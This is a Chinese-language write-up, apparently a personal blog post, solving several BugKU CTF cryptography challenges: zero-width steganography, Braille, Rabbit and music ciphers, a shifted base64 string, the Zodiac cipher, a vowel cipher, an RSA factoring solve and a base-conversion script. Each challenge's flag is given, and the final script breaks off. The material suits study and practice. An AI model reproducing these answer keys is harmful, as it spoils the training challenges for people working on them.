‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍</p><p>《通知》要求，“十四五”期间，要重点支持中西部欠发达地区农村义务教育学校、幼儿园骨干教师、校园长和培训者深度培训；实现巩固拓展教育脱贫攻坚成果同乡村振兴有效衔接，支持国家乡村振兴重点帮扶县教师校长能力整体提升；辐射带动省、市、县、校级教师培训，实现教师培训全覆盖。 《通知》从培训内容体系、机制改革、能力建设、监管评价4个方面明确10项重点工作。在内容方面，强调要突出教师核心素养培养，将思想政治和师德师风作为必修内容。在机制改革方面，强调要实行分层分类精准培训，建立教师自主发展机制；创新教师发展协同机制，深入实施教师发展“一对一”精准帮扶；推动人工智能与教师培训融合，探索“智能+教师培训”，形成人工智能支持教师终身学习、持续发展的机制。在能力建设方面，强调要完善教师专业发展支持服务体系，加强市县教师发展机构专业化建设，建强专业化教师培训队伍，加强培训资源和平台建设，实现优质资源全面覆盖、全体共享。在监管评价方面，强调强化培训实施的监管评价，对教师学习过程和效果进行综合评价，适时提供反馈和跟踪指导。</p></blockquote><p>这个是一种<a href="http://www.atoolbox.net/Tool.php?Id=829">隐藏信息</a>使用隐藏信息解密得到<s>明文</s>(其实还是一重秘文)。<a href="https://ctf.bugku.com/tool/cvecode">社会主义核心价值观加密</a>这个加密方式在bugku靶场上面就有。解密得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;why_d0nt_you_try_t0_understand_socia1ism?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="19-这是个盲兔子-竟然在唱歌">19 这是个盲兔子,竟然在唱歌!</h4><p>这个题目名很有水平，在做完这个之后，我更是如此觉得。对应的这个题目的三层解码盲文，rabbit加密和解密，以及音乐符号密码。</p><blockquote><p>⡥⠂⡶⡃⡔⡷⡦⡛⡨⠁⠟⡚⠉⠇⡳⡜⡉⡤⡴⡑⡓⡆⡑⡔⡆⡠⡩⡹⠂⡢⡪⡵⡢⡟⡶⡹⠃⡒⠁⡥⡞⠟⡚⡞⡣⡣⡤⡀⡡⡆⠉⡼⡻⠀⠉⡧⡙⠇⡦⡇⡧⡅⡺⡑⠺⡑⡉⡑⠂⡞⡱⡳⠁⡊⡢⡩⡊⡚⡊⡕⡛⠀⡕⠂⡩⡱⡾⡴⠂⡶⡛⠈⡹⡇⡗⡑⠃⠁⡆⡝⡽⡺⡨⡙⠛⠅⠁⡠⡇⡩⡅⡸⡑⡧⡑⡸⠅⡆⡨⠛⡣⡨⡑⡢⡝⠁⡟⡚⡿⠺⠛⡿⡕⡴⡛⡡⠀⡔⠉⠂⡴⡃⠃⠀⡿⡹⠄⡺⡀⡵⡊⡝⡪⡨⡛⡦⡖⡛⡧⡡⡪⠈⡲⠟⡝⡔⡕⠅⡄⡞⠟⠂⡵⡉⠅⡩⡦⡼⡈⡴⡩⡈⠟⡞⡦⡩⡆⡛⡴⡾⡈⡁⡁⡗⠺⡹⡾⡆⡢⡹⡠⡈⡃⡛⠆⡁⡖⡻⡉⡡⡻⡓⠆⡁⡼⡷⠃⡛⠅⡵⠈⡝⡂⠉⡃⡄⡠⡠⡡⡒⡁⡃⡁⠅⡾⡨⠆⡘⠇⡄⡁⡲⠅⡖⠛⡓⡤⡃⡕⡺⡃⡝⡛⡳⠀⡢⡒⡙⠂⠺⡱⡉⡻⡒⡨⡄⡒⡒⡈⡱⡧⡽⠆⡉⡷⡹⠛⡊⠟⡥⡜⡳⡶⠆⡺⠉⠂⡂⡛⡥⡓⡝⡴⠆⡽⡟⠅⡿⡻⡸⡺⠆⡇⠂⠈⡼⡤⡕⠂⠈⡤⠅⠛⠁⡇⡟⡧⡈⡗⡲⡊⡸⠉⡻⠺⡱⡻⡥⠍=</p></blockquote><p>通过**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">盲文密码</a>**解码得到:</p><blockquote><p>U2FsdGVkX1/j97ClyTDacvadvPYI2RZERoFI3b1Un/jnSSTpQv9LK09Wi7VwWuJaaya2nAC1zRYzjzek0e2YAND2Fk8Iwga31vmMJXi+51PwYuHaWaH5vX+SXaRm1ojO+OeDkQ0d92Ds30OI4JpEzmZXkVfkWQZ8B/mde5tn/2Ey5YVLxDYx/nVYvkDNxqqgINvRIPxsk6qfKyQKc6qLG3k5E8mr9stPPQbqsq5NX6h7tqB5f+cTseJsmkC0Rbi2AyKbXtbbxAWM6yGI+z/UlCF6J92rkUcmD6Mo5OKHJ6w28LTe28T5+1woWxgBzH9KAKU=</p></blockquote><p>这一层是**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">rabbit</a>**密码，在题干上有这一点。</p><blockquote><p>♬♯♩¶♬♫¶♭♩¶♫♪‖♯♬♭♩♬‖♫‖∮‖♩♬§‖♪¶‖♬♩♬§‖♩¶∮♬♬‖♪¶♭¶♯♫♯♩♫‖‖♬§‖♫♬♯♬§♫‖♩♩♫∮♬♩♫‖‖♪¶∮♫‖♫♫♯=</p></blockquote><p>在通过**<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音乐解密</a><strong>得到</strong>flag**</p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;2at746c5jfc6nh5klxs0c7bcvrzfv5nv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="19-7-1-0">19 7+1=0</h4><blockquote><p>4nXna/V7t2LpdLI44mn0fQ==</p></blockquote><p>这个是base64编码，但又有问题。使用在线工具编译得到的会是**ⵧk{b鴲8⩴}**需要使用base64-&gt;text方式解密，得到的结果依旧不都在可读范围内</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64miwen <span class="token operator">=</span> <span class="token string">'4nXna/V7t2LpdLI44mn0fQ=='</span>mingwen <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span class="token comment">#这一个题目生成的秘文应该类似于bugku&#123;&#125;,查看ascll码判断有多少出现在不可打印区域</span><span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    j <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过base64-&gt;text方式看到?u?k?{?b?t?8?i?}，单数上面是不属于可输入范围，查看每一个ascll码的值，发现你们一堆200多的<s>ascll码</s>。这个flag大概是bugku{}，通过ascll码对照表发现相比正常的ascll码多了128，通过脚本解密得到flag。</p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/1634378561332.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;7bit28bit&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="20-黄道12宫">20 黄道12宫</h4><blockquote><p><strong>黄道十二宫杀手</strong>（Zodiac Killer）可能是世界上最知名的高智商连环杀手，52年来从未被抓获。这个连环变态杀手，在美国加州南部杀死了至少5人，声称自己手上有<strong>37条人命</strong>。作案的同时，他寄送了很多封以<strong>挑衅</strong>为主的信件给媒体，这些信件中包含着一些未公开的细节以及犯罪证据，甚至在其中署名。虽然一封408字符的文件已经被专家破解，但是其他信件继续困扰了警方和密码学专家<strong>51年</strong>。</p><p>1969年11月8日，在杀死了两名受害者之后，他向《旧金山纪事报》致信，并随信附上了340个加密字符。该密码被称为<strong>Z-340</strong>，或简称为340，一直未曾有人成功破解。</p></blockquote><p>关于这个加密的相关可以看这篇博客<a href="https://blog.csdn.net/QbitAI/article/details/111148126?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163437540116780366577743%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163437540116780366577743&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-111148126.first_rank_v2_pc_rank_v29&amp;utm_term=%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB%E5%AF%86%E7%A0%81&amp;spm=1018.2226.3001.4187">黄道十二宫杀手密码51年后被破解，来自两位程序员与数学家通力合作</a></p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/2.png" alt="2"></p><blockquote><p>II KILLED A LOT OF PEOPLE THERE ARE ENOUGH<br>SLAVES TO WORK FOR I I HOPE YOU CAN DECRYPT<br>IT AS SOON AS POSSIBLE.THIS IS FLAG ALPHAN<br>ANKE OTHERWISE I WILL CONTINUE TO KILLL</p></blockquote><p>得到<s>flag{alphananke}</s></p><hr><h4 id="21-你看得懂我的乐谱吗？">21 你看得懂我的乐谱吗？</h4><p>抱歉我不懂音乐，我不懂这个乐谱。但是在bugku的评论区有人问到</p><blockquote><p>把音符还原成字母串后怎么不管大写还是小写放入flag{}都不对，去掉flag四个字也不对 。</p></blockquote><p>把音符还原成字符串,这是个啥？之前那道题是音符加密，我以为这一道题也是与那一道相关。</p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/%E4%B9%90%E8%B0%B1.png" alt=""></p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/3.jpg" alt=""></p><p>看到这个之后，我还是不太明白，这里放一个大佬的推测。<img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/4.png" alt="4"></p><p>这样可以得出flag，关于这个题目我想说，我不懂你的乐谱，我懂个de</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token punctuation">&#123;</span>EMARKCISSOACHHLG<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="22-math-english">22 Math&amp;English</h4><p><s>说实话，我会数学，但我真的不会英语。</s></p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/5.png" alt=""></p><blockquote><p>计算结果： 21 33 1 22 3 44 54 5 1 35 54 3 35 41 52 13</p></blockquote><p>结果全部都含义，1,2,3,4,5五个数字。他们告诉我这个是元音密码，这里是元音密码对照表。</p><p><img src="./BugKU%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Crypto%E7%AF%87/6.png" alt="6"></p><p>对于得到<s>flagisyuanyinpwd</s>flagis记得删掉<strong>flag{yuanyinpwd}</strong></p><hr><h4 id="23-rsa">23  RSA</h4><blockquote><p>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597<br>e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</p><p>enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</p></blockquote><p>使用在线的质数分解工具分解n，</p><pre class="line-numbers language-none"><code class="language-none">Q：28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">P:15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>搞了一个求解脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s<span class="token punctuation">,</span>s2n<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">%</span> mp<span class="token operator">=</span><span class="token number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span>q<span class="token operator">=</span><span class="token number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span>e <span class="token operator">=</span> <span class="token number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span>d <span class="token operator">=</span> modinv<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qm<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到~~<strong>flag{Wien3r_4tt@ck_1s_3AsY}</strong>~~</p><h4 id="25-进制转换">25 进制转换</h4><blockquote><p>二进制、八进制、十进制、十六进制，你能分的清吗？ 来源：第七届大学生网络安全技能大赛</p></blockquote><p>b 2进制 o 8进制 d 10进制 x 16进制，根据首字母确定进制并进行相应的转换，得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> s<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"d87"</span><span class="token punctuation">,</span><span class="token string">"x65"</span><span class="token punctuation">,</span><span class="token string">"x6c"</span><span class="token punctuation">,</span><span class="token string">"x63"</span><span class="token punctuation">,</span><span class="token string">"o157"</span><span class="token punctuation">,</span><span class="token string">"d109"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"d116"</span><span class="token punctuation">,</span><span class="token string">"b1101111"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"x6b"</span><span class="token punctuation">,</span><span class="token string">"b1100101"</span><span class="token punctuation">,</span><span class="token string">"b1101100"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d105"</span><span class="token punctuation">,</span><span class="token string">"x62"</span><span class="token punctuation">,</span><span class="token string">"d101"</span><span class="token punctuation">,</span><span class="token string">"b1101001"</span><span class="token punctuation">,</span><span class="token string">"d46"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"d71"</span><span class="token punctuation">,</span><span class="token string">"x69"</span><span class="token punctuation">,</span><span class="token string">"d118"</span><span class="token punctuation">,</span><span class="token string">"x65"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b1111001"</span><span class="token punctuation">,</span><span class="token string">"o157"</span><span class="token punctuation">,</span><span class="token string">"b1110101"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"o154"</span><span class="token punctuation">,</span><span class="token string">"x61"</span><span class="token punctuation">,</span><span class="token string">"x67"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"o141"</span><span class="token punctuation">,</span><span class="token string">"d115"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"x67"</span><span class="token punctuation">,</span><span class="token string">"o151"</span><span class="token punctuation">,</span><span class="token string">"x66"</span><span class="token punctuation">,</span><span class="token string">"d116"</span><span class="token punctuation">,</span><span class="token string">"b101110"</span><span class="token punctuation">,</span><span class="token string">"b100000"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"d108"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"o147"</span><span class="token punctuation">,</span><span class="token string">"d123"</span><span class="token punctuation">,</span><span class="token string">"x31"</span><span class="token punctuation">,</span><span class="token string">"b1100101"</span><span class="token punctuation">,</span><span class="token string">"b110100"</span><span class="token punctuation">,</span><span class="token string">"d98"</span><span class="token punctuation">,</span><span class="token string">"d102"</span><span class="token punctuation">,</span><span class="token string">"b111000"</span><span class="token punctuation">,</span><span class="token string">"d49"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"d54"</span><span class="token punctuation">,</span><span class="token string">"b110011"</span><span class="token punctuation">,</span><span class="token string">"x39"</span><span class="token punctuation">,</span><span class="token string">"o64"</span><span class="token punctuation">,</span><span class="token string">"o144"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"d53"</span><span class="token punctuation">,</span><span class="token string">"x61"</span><span class="token punctuation">,</span><span class="token string">"b1100010"</span><span class="token punctuation">,</span><span class="token string">"b1100011"</span><span class="token punctuation">,</span><span class="token string">"o60"</span><span class="token punctuation">,</span><span class="token string">"d48"</span><span class="token punctuation">,</span><span class="token string">"o65"</span><span class="token punctuation">,</span><span class="token string">"b1100001"</span><span class="token punctuation">,</span><span class="token string">"x63"</span><span class="token punctuation">,</span><span class="token string">"b110110"</span><span class="token punctuation">,</span><span class="token string">"d101"</span><span class="token punctuation">,</span><span class="token string">"o63"</span><span class="token punctuation">,</span><span class="token string">"b111001"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"d51"</span><span class="token punctuation">,</span><span class="token string">"o70"</span><span class="token punctuation">,</span><span class="token string">"d55"</span><span class="token punctuation">,</span><span class="token string">"b1100010"</span><span class="token punctuation">,</span><span class="token string">"d125"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b101110"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"b1001000"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"d118"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"x20"</span><span class="token punctuation">,</span><span class="token string">"d97"</span><span class="token punctuation">,</span><span class="token string">"o40"</span><span class="token punctuation">,</span><span class="token string">"d103"</span><span class="token punctuation">,</span><span class="token string">"d111"</span><span class="token punctuation">,</span><span class="token string">"d111"</span><span class="token punctuation">,</span><span class="token string">"x64"</span><span class="token punctuation">,</span><span class="token string">"d32"</span><span class="token punctuation">,</span><span class="token string">"o164"</span><span class="token punctuation">,</span><span class="token string">"b1101001"</span><span class="token punctuation">,</span><span class="token string">"x6d"</span><span class="token punctuation">,</span><span class="token string">"o145"</span><span class="token punctuation">,</span><span class="token string">"x7e"</span><span class="token punctuation">]</span>s1<span class="token operator">=</span><span class="token string">""</span>t<span class="token operator">=</span><span class="token string">""</span>t1<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    s1<span class="token operator">=</span>i    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'d'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'x'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t        <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'o'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t                    <span class="token keyword">if</span> s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'b'</span><span class="token punctuation">:</span>            t<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t<span class="token keyword">print</span> t1            <span 